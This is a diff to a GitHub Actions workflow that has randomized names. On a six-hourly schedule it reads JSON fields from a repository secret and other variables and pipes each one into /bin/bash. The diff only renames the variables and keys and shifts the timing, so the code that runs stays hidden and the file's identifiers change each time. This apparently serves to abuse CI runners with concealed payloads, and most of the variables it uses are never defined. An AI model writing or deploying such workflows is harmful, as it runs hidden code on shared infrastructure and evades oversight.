@@ -1,21 +1,24 @@
 name: gelubang0987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 1/6 * * *'
-jobs:  # 5712
+    - cron: '18 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gelubang0987
         env:
-          bbv8425: ${{ secrets.bbv8425 }}
+          jzo0: ${{ secrets.jzo0 }}
         run: |
-          echo $bbv8425 | jq -r .tj3 | /bin/bash
-          echo $wqj56980 | jq -r .kevn441 | /bin/bash
-          echo $jy780 | jq -r .y71887 | /bin/bash
-          echo $yvn679 | jq -r .zkb694 | /bin/bash
-          echo $mzej10 | jq -r .lz45 | /bin/bash
-          echo $bdjpy5195 | jq -r .uue40460 | /bin/bash
+          echo $jzo0 | jq -r .tn60 | /bin/bash
+          echo $ebsli9770 | jq -r .mixz0 | /bin/bash
+          echo $mw0 | jq -r .eylo2 | /bin/bash
+          echo $bj19659 | jq -r .trq3225 | /bin/bash
+          echo $nchi441 | jq -r .pxk6 | /bin/bash
+          echo $h94887 | jq -r .fjf65917 | /bin/bash
 
